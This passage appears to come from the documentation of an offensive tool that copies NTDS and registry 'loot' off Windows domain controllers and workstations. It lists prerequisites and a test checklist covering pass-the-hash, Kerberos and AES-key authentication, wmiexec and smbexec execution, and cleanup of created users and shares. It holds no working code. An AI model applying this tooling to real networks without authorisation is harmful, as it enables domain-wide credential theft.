- ntfs-3g (or Linux 5.15+ with the `ntfs3` kernel module)
- sudo access on the attacker box

---

## Testing checklist

Before merging the rewrite, test each case:

- [ ] DC mode with password auth against Server 2019
- [ ] DC mode with password auth against Server 2022
- [ ] DC mode with password auth against Server 2025
- [ ] DC mode with NTLM hash auth
- [ ] DC mode with Kerberos auth (`-k -no-pass`)
- [ ] DC mode with AES key auth (`-aesKey`)
- [ ] Workstation mode against Windows 10
- [ ] Workstation mode against Windows 11
- [ ] `-exec-method wmiexec` (default) against any target
- [ ] `-exec-method smbexec` against any target
- [ ] `-exec-method smbexec -unsafe-exec` verifies flag forwarding
- [ ] `-volume D:` against a DC with NTDS on D:
- [ ] `-loot-output /mnt/remote` with a mounted NFS or CIFS share
- [ ] `-no-cleanup-image` keeps the image in the loot directory
- [ ] `-share` is forwarded to the exec tool
- [ ] Cleanup removes user, group, share, and smb.conf backup
- [ ] Cleanup detaches loop devices
- [ ] Mount failure (missing ntfs-3g) prints a clear error
- [ ] Mount failure prints an error and exits
- [ ] Missing required file prints an error but continues
- [ ] Missing optional .LOG file prints a warning and continues
- [ ] `.LOG1` and `.LOG2` files are collected in DC mode
- [ ] `.LOG1` and `.LOG2` files are collected in workstation mode
